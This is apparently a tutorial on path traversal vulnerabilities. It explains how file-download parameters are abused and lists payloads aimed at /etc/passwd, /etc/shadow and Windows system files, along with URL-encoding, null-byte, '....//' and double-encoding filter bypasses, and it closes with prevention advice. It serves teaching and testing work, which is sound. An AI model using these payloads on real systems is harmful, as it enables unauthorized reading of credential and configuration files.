

## Path Traversal is a vulnerability that allows an attacker to access files and directories outside the intended web directory.

It is also known as:

```text
Directory Traversal
```

---

# How Does It Work?

## Some web applications allow users to request files.

Example:

```http
GET /download?file=report.pdf
```

The application reads the file from the server and returns it to the user.

---

# The Vulnerability

## If the application does not properly validate user input, an attacker can modify the file path.

Example:

```http
GET /download?file=../../../etc/passwd
```

Instead of downloading **report.pdf**, the application returns the system password file.

---

# Why Does It Happen?

## The application trusts user-supplied file paths without proper validation.

---

# Common Targets

## Attackers may try to access:

### Linux

```text
/etc/passwd
```

```text
/etc/shadow
```

```text
/var/www/html/config.php
```

---

### Windows

```text
C:\Windows\win.ini
```

```text
C:\Windows\System32\drivers\etc\hosts
```

---

# Common Payloads

## Basic Traversal

```text
../../../etc/passwd
```

---

## Windows

```text
..\..\..\Windows\win.ini
```

---

## URL Encoded

```text
..%2f..%2f..%2fetc%2fpasswd
```

---

# Impact

## A successful Path Traversal attack may allow an attacker to:

- Read sensitive files
    
- Access configuration files
    
- Retrieve application source code
    
- Discover usernames
    
- Obtain credentials
    
- Gather information for further attacks
    

---

# How Is It Tested?

## A penetration tester modifies file path parameters in:

- URL parameters
    
- POST requests
    
- JSON data
    
- Cookies
    

Then attempts to access files outside the intended directory.

---
# Traversal Filter Bypass
# URL Encoding & Null Byte

## Some Path Traversal payloads use URL Encoding to bypass input filters.

Common examples:

|Encoded|Character|
|---|---|
|`%20`|Space|
|`%2f`|`/`|
|`%5c`|`\`|
|`%2e`|`.`|
|`%00`|Null Byte (`\0`)|

Example:

```text
..%2f..%2fetc%2fpasswd
```

↓

```text
../../etc/passwd
```

---

## Null Byte (`%00`)

The `%00` value represents a **Null Byte** (`\0`).

Older applications could terminate the file path at the Null Byte, allowing attackers to bypass appended file extensions.

Example:

```text
../../../etc/passwd%00.jpg
```

Older vulnerable applications interpreted it as:

```text
../../../etc/passwd
```

---


## Some applications block the classic traversal sequence:

```text
../
```

Attackers may use alternative patterns to bypass weak filters.

Example:

```text
....//
```

Some vulnerable applications normalize it to:

```text
../
```

Example payload:

```text
....//....//....//etc/passwd
```

After normalization, it becomes:

```text
../../../etc/passwd
```

This technique works only against applications with weak or improper input filtering.
Modern applications generally block this technique.

---
# URL Encoding

|Encoded|Decoded|
|---|---|
|`%2f`|`/`|
|`%5c`|`\`|
|`%2e`|`.`|
|`%20`|Space|

## Double URL Encoding

Some applications decode user input more than once.

Example:

```text
%252f
```

↓

```text
%2f
```

↓

```text
/
```

---

This technique is commonly used to bypass weak input filters.
# Prevention

## Applications should:

- Validate user input
    
- Restrict file access to specific directories
    
- Use allowlists for permitted files
    
- Avoid using user input directly in file paths
    

---
